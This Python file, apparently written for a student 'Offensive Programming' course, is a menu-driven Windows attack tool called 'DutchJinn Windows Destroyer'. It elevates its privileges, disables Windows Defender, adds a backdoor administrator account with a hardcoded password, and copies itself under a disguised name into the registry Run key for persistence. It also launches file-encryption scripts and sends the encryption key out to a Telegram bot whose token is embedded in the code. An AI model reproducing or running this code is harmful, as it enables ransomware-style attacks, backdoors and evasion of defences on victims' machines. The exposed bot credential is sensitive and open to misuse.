#! "C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\env\Scripts\python"
#peter oldenburger - Windows-destroyer.py - Offensive Programming Blok3

# Importeer benodigde bibliotheken en modules
import os #functionaliteiten zoals het lezen of schrijven van bestanden, manipuleren van paden
import shutil #bestandsbeheer 
import subprocess  #nieuwe processen te starten, verbinding te maken met hun input/output/error pipes en de returncodes op te halen
import sys #toegang tot sommige variabelen die door de interpreter worden gebruikt en functies die sterk interageren met de interpreter.
import winreg #Biedt toegang tot de Windows Register Database voor het lezen, schrijven, en verwijderen van registerwaarden en -sleutels.
import winreg as reg
import logging #raamwerk voor het uitvoeren van logboekregistratie in applicaties en bibliotheken.
import ctypes #Staat interactie toe met C-code.
import requests #het maken van HTTP-aanvragen om gegevens van het internet te krijgen of te versturen


# Activeer de virtuele omgeving
def activate_virtual_environment(env_path):
    """Activate the virtual environment."""
    if sys.platform.startswith('win'):
        activate_script = os.path.join(env_path, 'Scripts', 'activate.bat')
    else:
        activate_script = os.path.join(env_path, 'bin', 'activate')
    subprocess.call([activate_script], shell=True)

env_path = r'C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\env'

activate_virtual_environment(env_path)


# Verkrijg beheerdersrechten
from elevate import elevate
elevate()


# logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Controleer of een gebruikersaccount bestaat
def check_user_exists(username):
    """Check if a user exists on the system."""
    try:
        subprocess.run(["net", "user", username], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True 
    except subprocess.CalledProcessError:
        return False 


# Vestig persistentie in het register
def establish_persistence():
    """Establish persistence by adding a registry entry."""
    curr_executable = sys.executable
    app_data = os.getenv("APPDATA")
    to_save_file = os.path.join(app_data, "system32_data.exe")

    if not os.path.exists(to_save_file):
        shutil.copyfile(curr_executable, to_save_file)
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as key_obj:
            winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
        logging.info("Persistence established.")
    else:
        logging.info("Executable already present.")


# Controleer of persistentie is gevestigd
def check_persistence():
    """Check if persistence is established."""
    app_data = os.getenv("APPDATA")
    persistence_path = os.path.join(app_data, "system32_data.exe")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        value, _ = winreg.QueryValueEx(key, "systemfilex64")
        if value == persistence_path:
            return True  
    except FileNotFoundError:
        pass
    return False


# Voeg een administratieve gebruiker toe
def add_admin_user(username, password):
    """Add a new user and grant admin privileges."""
    try:
        # Nieuwe gebruiker
        subprocess.run(["net", "user", username, password, "/add"], check=True)
        # voeg de nieuwe gebruiker toe aan de Administrators group
        subprocess.run(["net", "localgroup", "Administrators", username, "/add"], check=True)
        logging.info(f"User {username} added as an Administrator.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to add user {username}. Error: {e}")


# Verkrijg het IP-adres van het slachtoffer
def get_victim_ip():
    """Get the victim's IP address."""
    try:
        ip = subprocess.run(["ipconfig"], check=True, capture_output=True, text=True)
        logging.info(f"Victim's IP address:\n{ip.stdout}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to get victim's IP address. Error: {e}")
        

# Ping Slachtoffer (om te kijken of die online is, etc)
def ping_victim():
    """Ping een doelwit op basis van het opgegeven IP-adres."""
    ip_address = input("Voer het IP-adres van het slachtoffer in: ").strip()
    try:
        # Voer het ping commando uit, ping het IP-adres 10 keer
        response = subprocess.run(["ping", ip_address, "-n", "10"], check=True, text=True, capture_output=True)
        print(response.stdout)
        logging.info(f"DutchJinn > Ping succesvol uitgevoerd op {ip_address}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Fout tijdens het pingen van {ip_address}. Error: {e}")
        print(f"Fout tijdens het pingen. Zie logbestand voor meer details.")


# Controleer de status van Windows Defender
def check_windows_defender_status():
    """Check the status of Windows Defender on the victim."""
    try:
        subprocess.run(["powershell", "-Command", "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to check Windows Defender status. Error: {e}")


# Schakel Windows Defender uit
def disable_windows_defender():
    """Disable Windows Defender on the victim."""
    try:
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True)
        logging.info("Windows Defender disabled on victim.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to disable Windows Defender. Error: {e}")

# Schakel Windows Defender in (xxx)
def enable_windows_defender():
    pass



# Controleer of de admin gebruiker bestaat
def check_admin_user():
    """Check if the admin user exists on the victim."""
    username = "dutchjinn"
    if check_user_exists(username):
        logging.info("Admin present: dutchjinn")
    else:
        logging.info("Admin not present.")


# Maak een admin gebruiker aan
def create_admin_user():
    """Create an admin user on the victim."""
    username = "dutchjinn"
    password = "hackeR888!"
    if not check_user_exists(username):
        add_admin_user(username, password)
    else:
        logging.info("Admin already present.")


# Controleer persistentie
def check_persistence_victim():
    """Check if persistence is established on the victim."""
    if check_persistence():
        logging.info("Persistence activated")
    else:
        logging.info("Persistence not activated")


# Vestig persistentie 
def create_persistence_victim():
    """Establish persistence on the victim."""
    establish_persistence()


# Stel het bureaubladachtergrond in
def set_wallpaper(path):
    """Set the wallpaper to the specified image path and apply the 'Fit' style."""
    set_wallpaper_style()
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

# Stel de style van het bureaubladachtergrond in
def set_wallpaper_style():
    """Set the wallpaper style in the registry to 'Fit'."""
    key_path = r"Control Panel\Desktop"
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, "WallpaperStyle", 0, reg.REG_SZ, "6")  # Use "3" if "6" does not work as expected
        reg.SetValueEx(key, "TileWallpaper", 0, reg.REG_SZ, "0")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Failed to set wallpaper style: {e}")


# Voer Notepad Script uit
def execute_destroy_1_notepad():
    """Executes the external script 'destroy-1-notepad.py'"""
    script_path = os.path.join(os.getcwd(), 'destroy-1-notepad.py')
    try:
        subprocess.run([sys.executable, script_path], check=True)
        logging.info("'destroy-1-notepad.py' executed successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute 'destroy-1-notepad.py'. Error: {e}")

# Run Script
def run_script(script_name):
    """Runs a script based on the given script name."""
    script_path = os.path.join(os.getcwd(), script_name)
    try:
        subprocess.run([sys.executable, script_path], check=True)
        logging.info(f"{script_name} executed successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute {script_name}. Error: {e}")


# Toon en Exporteer Key naar opgegeven directory = oud vervangen door export naar telegram
def display_and_export_key():
    key_file_path = "encryption_key.key"  
    export_directory = input("Enter the directory to export the key to: ").strip()
    
    if not os.path.isdir(export_directory):
        print(f"The directory {export_directory} does not exist.")
        return
    
    try:
        with open(key_file_path, 'rb') as key_file:
            key = key_file.read()
            print(f"Encryption Key: {key.hex()}")
              
            export_path = os.path.join(export_directory, os.path.basename(key_file_path))
            with open(export_path, 'wb') as export_file:
                export_file.write(key)
            print(f"Key exported successfully to {export_path}")
    except FileNotFoundError:
        print("Encryption key file not found.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Voer uit: export-key.py script / Oud = vervangen door exporteer key naar Telegram
def run_export_key_script():
    """Runs the export-key.py script."""
    script_name = "export-key.py"
    try:
        subprocess.run([sys.executable, script_name], check=True)
        logging.info(f"{script_name} executed successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute {script_name}. Error: {e}")


#Exporteer Crypt-Key naar Telegram
def send_key_to_telegram():
    """Sends the encryption key to the specified Telegram chat."""
    bot_token = "6672103339:AAHQrAHVnH32XU-0-EOVhWaE0gKyMWLr2Mo"
    chat_id = "5517521840"
    key_file_path = "encryption_key.key"

    try:
        with open(key_file_path, 'rb') as file:
            key_data = file.read()
            key_hex = key_data.hex()

        message = f"Encryption Key: {key_hex}"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {'chat_id': chat_id, 'text': message}
        response = requests.post(url, data=data)

        if response.status_code == 200:
            print("Key successfully sent to Telegram.")
            logging.info("Key successfully sent to Telegram.")
        else:
            print("Failed to send key to Telegram.")
            logging.error("Failed to send key to Telegram. Status Code: " + str(response.status_code))
    except FileNotFoundError:
        print("Encryption key file not found.")
        logging.error("Encryption key file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
        logging.error(f"An error occurred when sending key to Telegram: {e}")


# Toon DutchJinn Main-Menu   
def display_menu():
    """Display the main menu."""
    print("Menu:")
    print("1. Get victim's IP")
    print("2. Ping victim")
    print("3. Check Status Windows Defender, $true=disabled - $false=enabled.")
    print("4. Disable Windows Defender on victim")
    print("5. Enable Windows Defender on victim")
    print("6. Check admin user on victim")
    print("7. Create admin user on victim")
    print("8. Check persistence on victim")
    print("9. Create persistence on victim")
    print("10. Set DutchJinn888 Wallpaper")
    print("11. Execute 'Destroy Code 1 - Notepad x5'")
    print("12. Destroy 2 - Encrypt Files - (in DIR: Encrypt-This)")
    print("13. Destroy 2 - Decrypt Files - (in DIR: Encrypt-This)")
    print("14. Export Crypt-Key to Telegram")
    print("0. Exit")

# main
def main():
    if check_persistence():
        logging.info("Persistence activated")
    else:
        logging.info("Activating persistence...")

    while True:
        display_menu()
        choice = input("DutchJinn Windows Destroyer - Enter your choice: ").strip()


        if choice == "1":
            get_victim_ip()
        elif choice == "2":
            ping_victim()
        elif choice == "3":
            check_windows_defender_status()
        elif choice == "4":
            disable_windows_defender()
        elif choice == "5":
            enable_windows_defender()
        elif choice == "6":
            check_admin_user()
        elif choice == "7":
            create_admin_user()
        elif choice == "8":
            check_persistence_victim()
        elif choice == "9":
            create_persistence_victim()
        elif choice == "10":
            wallpaper_path = r'C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\wallpaper888.jpg' 
            set_wallpaper(wallpaper_path)
            print("Wallpaper has been set successfully.")
        elif choice == "11":
            execute_destroy_1_notepad()
        elif choice == "12":
            print("Encrypting Files in 'Encrypt-This'...")
            run_script("destroy-2-encrypt.py")
        elif choice == "13":
            print("Decrypting Files in 'Encrypt-This'...")
            run_script("destroy-2-decrypt.py")

        elif choice == "14":
            send_key_to_telegram()


        elif choice == "0":
            print("Exiting and returning to main menu...")
            main_py_path = os.path.join(os.path.dirname(__file__), 'main.py')  
            subprocess.Popen([sys.executable, main_py_path]) 
            sys.exit()
            break
        else:
            print("Invalid choice. Please enter a valid option.")

        if choice not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14']:
            print("Invalid choice. Please enter a valid option.")
            continue

if __name__ == "__main__":
    main()
